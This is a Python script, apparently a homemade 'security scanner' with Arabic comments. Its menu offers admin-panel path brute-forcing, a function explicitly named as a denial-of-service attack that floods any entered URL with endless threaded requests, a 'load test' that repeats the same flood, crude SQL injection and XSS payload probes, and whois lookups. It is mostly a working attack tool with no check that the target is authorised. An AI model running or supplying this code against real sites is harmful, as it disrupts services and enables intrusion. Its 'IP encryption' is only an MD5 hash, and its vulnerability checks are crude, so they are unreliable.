import requests
from colorama import Fore, Style, Back, init
import threading
import hashlib
import whois
from urllib.parse import urlparse

# تفعيل مكتبة colorama
init(autoreset=True)

# معلومات المصمم
designer_name = "Ayham Alwdy"
designer_phone = "/00963938627021"
designer_facebook = "Ayham Alwdy"

# قائمة موسعة من المسارات الشائعة للوصول إلى لوحة الإدارة
admin_paths = [
    'admin/', 'admin.php', 'admin/login.php', 'admin/index.php', 'administrator/', 'admin_area/',
    'login.php', 'admin1.php', 'admin2.php', 'admin/login.html', 'admin/home.php', 'admin/controlpanel/',
    'admincontrol/', 'adminpanel/', 'cpanel/', 'adm/', 'admin/account.php', 'admin/manage.php', 
    'admin/adminLogin.php', 'admin_login.php', 'moderator.php', 'moderator/login.php', 'useradmin/',
    'adminLogin/', 'login/admin.php', 'admin_dashboard/', 'sysadmin/', 'admin_console/', 'control_panel/',
    'adminhome/', 'login/adminLogin.php', 'admin/main.php', 'admin/cp.php', 'admin_area/admin.php',
    'admincp/index.asp', 'admincontrol.asp', 'controlpanel.asp', 'admin.asp', 'adminarea/', 
    'administrator/login.html', 'adminarea/index.php', 'adminsite/', 'admincp/login.php', 'admins/login.php',
    'backend/', 'administer/', 'webadmin/', 'wp-admin/', 'wp-login.php', 'administrator.php',
    'moderator/admin.php', 'admin/adm.php', 'login_admin.php', 'cp/', 'myadmin/', 'secretadmin/', 
    'adminpanel/login.php', 'root/admin.php', 'management/', 'manager/', 'admin/loginadmin.php'
]

# وظيفة لفحص الموقع للعثور على لوحة الإدارة
def scan_website(url):
    found_admin_pages = []
    
    # التحقق من وجود لوحة إدارة في كل مسار
    for path in admin_paths:
        full_url = url + path
        try:
            response = requests.get(full_url)
            if response.status_code == 200:
                print(Fore.GREEN + Style.BRIGHT + f"[+] Found admin page: {full_url}" + Style.RESET_ALL)
                found_admin_pages.append(full_url)
            else:
                print(Fore.RED + f"[-] Not found: {full_url}" + Style.RESET_ALL)
        except requests.exceptions.RequestException as e:
            print(Fore.YELLOW + f"[!] Error checking {full_url}: {e}" + Style.RESET_ALL)

    # إذا تم العثور على صفحات إدارة، سيتم حفظها في ملف
    if found_admin_pages:
        with open("admin_pages.txt", "w") as file:
            for page in found_admin_pages:
                file.write(page + "\n")
        print(Fore.CYAN + Back.BLACK + Style.BRIGHT + "[*] Admin pages saved to admin_pages.txt" + Style.RESET_ALL)
    else:
        print(Fore.RED + Style.BRIGHT + "[*] No admin pages found." + Style.RESET_ALL)

    return_to_menu()

# وظيفة لتنفيذ هجوم DoS
def dos_attack(target_url, thread_count=10):
    print(Fore.RED + Style.BRIGHT + f"[*] Starting DoS attack on {target_url} with {thread_count} threads..." + Style.RESET_ALL)
    
    def attack():
        while True:
            try:
                response = requests.get(target_url)
                print(Fore.YELLOW + f"[!] Attack sent to {target_url}, response code: {response.status_code}" + Style.RESET_ALL)
            except requests.exceptions.RequestException as e:
                print(Fore.YELLOW + f"[!] Error during DoS attack: {e}" + Style.RESET_ALL)
    
    # تشغيل الهجوم باستخدام عدة خيوط
    for _ in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.start()

    return_to_menu()

# وظيفة لتشفير عنوان IP
def encrypt_ip(ip_address):
    hashed_ip = hashlib.md5(ip_address.encode()).hexdigest()
    print(Fore.CYAN + Style.BRIGHT + f"[*] Encrypted IP: {hashed_ip}" + Style.RESET_ALL)
    return_to_menu()

# وظيفة لفحص ثغرة SQL Injection
def check_sql_injection(url):
    payload = "' OR '1'='1"
    vulnerable = False
    try:
        response = requests.get(url + payload)
        if "SQL" in response.text or "syntax" in response.text:
            vulnerable = True
    except requests.exceptions.RequestException as e:
        print(Fore.YELLOW + f"[!] Error checking for SQL injection: {e}" + Style.RESET_ALL)

    if vulnerable:
        print(Fore.GREEN + Style.BRIGHT + f"[+] SQL Injection vulnerability found at {url}" + Style.RESET_ALL)
    else:
        print(Fore.RED + Style.BRIGHT + "[-] No SQL Injection vulnerability found." + Style.RESET_ALL)

    return_to_menu()

# وظيفة لفحص ثغرة XSS
def check_xss(url):
    payload = "<script>alert('XSS')</script>"
    try:
        response = requests.get(url + "?q=" + payload)
        if payload in response.text:
            print(Fore.GREEN + Style.BRIGHT + f"[+] XSS vulnerability found at {url}" + Style.RESET_ALL)
        else:
            print(Fore.RED + Style.BRIGHT + "[-] No XSS vulnerability found." + Style.RESET_ALL)
    except requests.exceptions.RequestException as e:
        print(Fore.YELLOW + f"[!] Error checking for XSS: {e}" + Style.RESET_ALL)

    return_to_menu()

# وظيفة لجمع المعلومات عن الموقع
def gather_info(domain):
    try:
        domain_info = whois.whois(domain)
        print(Fore.GREEN + Style.BRIGHT + f"[+] Domain information for {domain}:" + Style.RESET_ALL)
        print(Fore.CYAN + str(domain_info))
    except Exception as e:
        print(Fore.YELLOW + f"[!] Error gathering info: {e}" + Style.RESET_ALL)

    return_to_menu()

# وظيفة لاختبار قوة تحمل الموقع
def load_test(url, users):
    def simulate_user():
        while True:
            try:
                response = requests.get(url)
                print(Fore.YELLOW + f"[!] Request sent to {url}, response code: {response.status_code}" + Style.RESET_ALL)
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"[!] Error during load test: {e}" + Style.RESET_ALL)

    print(Fore.GREEN + Style.BRIGHT + f"[*] Starting load test on {url} with {users} simulated users..." + Style.RESET_ALL)
    threads = []

    for _ in range(users):
        thread = threading.Thread(target=simulate_user)
        thread.start()
        threads.append(thread)

    # انتظار اكتمال جميع الخيوط
    for thread in threads:
        thread.join()

    return_to_menu()

# وظيفة للعودة إلى القائمة الرئيسية
def return_to_menu():
    print(Fore.CYAN + Style.BRIGHT + "\nDo you want to return to the main menu? (y/n): " + Style.RESET_ALL)
    choice = input().strip().lower()
    if choice == 'y':
        main_menu()
    else:
        print(Fore.RED + Style.BRIGHT + "Exiting the program." + Style.RESET_ALL)
        exit()

# عرض اسم المصمم بألوان ساطعة واحترافية
def main_menu():
    print(Fore.BLUE + Back.WHITE + Style.BRIGHT + "="*40 + Style.RESET_ALL)
    print(Fore.YELLOW + Back.MAGENTA + Style.BRIGHT + "   Multi-Tool Security Scanner   " + Style.RESET_ALL)
    print(Fore.BLUE + Back.WHITE + Style.BRIGHT + "="*40 + Style.RESET_ALL)
    print(Fore.MAGENTA + Style.BRIGHT + f"Developed by: {Fore.RED}{Back.YELLOW}{designer_name}" + Style.RESET_ALL)
    print(Fore.MAGENTA + Style.BRIGHT + f"Phone: {Fore.RED}{Back.YELLOW}{designer_phone}" + Style.RESET_ALL)
    print(Fore.MAGENTA + Style.BRIGHT + f"Facebook: {Fore.RED}{Back.YELLOW}{designer_facebook}" + Style.RESET_ALL)
    print(Fore.BLUE + Back.WHITE + Style.BRIGHT + "="*40 + Style.RESET_ALL)

    # اختيار العملية
    print(Fore.CYAN + Style.BRIGHT + "Choose an option:" + Style.RESET_ALL)
    print(Fore.CYAN + "1. Scan for Admin Panel")
    print(Fore.CYAN + "2. Perform DoS Attack")
    print(Fore.CYAN + "3. Encrypt IP Address")
    print(Fore.CYAN + "4. Check SQL Injection Vulnerability")
    print(Fore.CYAN + "5. Check XSS Vulnerability")
    print(Fore.CYAN + "6. Gather Website Information")
    print(Fore.CYAN + "7. Perform Load Test")

    choice = input(Fore.CYAN + "Enter your choice (1/2/3/4/5/6/7): " + Style.RESET_ALL)

    if choice == '1':
        website_url = input(Fore.CYAN + Style.BRIGHT + "Enter the website URL to scan: " + Style.RESET_ALL)
        scan_website(website_url)
    elif choice == '2':
        target_url = input(Fore.CYAN + Style.BRIGHT + "Enter the target URL for DoS attack: " + Style.RESET_ALL)
        thread_count = int(input(Fore.CYAN + Style.BRIGHT + "Enter the number of threads: " + Style.RESET_ALL))
        dos_attack(target_url, thread_count)
    elif choice == '3':
        ip_address = input(Fore.CYAN + Style.BRIGHT + "Enter the IP address to encrypt: " + Style.RESET_ALL)
        encrypt_ip(ip_address)
    elif choice == '4':
        website_url = input(Fore.CYAN + Style.BRIGHT + "Enter the website URL to check for SQL Injection: " + Style.RESET_ALL)
        check_sql_injection(website_url)
    elif choice == '5':
        website_url = input(Fore.CYAN + Style.BRIGHT + "Enter the website URL to check for XSS: " + Style.RESET_ALL)
        check_xss(website_url)
    elif choice == '6':
        domain = input(Fore.CYAN + Style.BRIGHT + "Enter the domain to gather information: " + Style.RESET_ALL)
        gather_info(domain)
    elif choice == '7':
        url = input(Fore.CYAN + Style.BRIGHT + "Enter the URL to perform load test: " + Style.RESET_ALL)
        users = int(input(Fore.CYAN + Style.BRIGHT + "Enter the number of simulated users: " + Style.RESET_ALL))
        load_test(url, users)
    else:
        print(Fore.RED + Style.BRIGHT + "Invalid choice!" + Style.RESET_ALL)
        return_to_menu()

if __name__ == "__main__":
    main_menu()
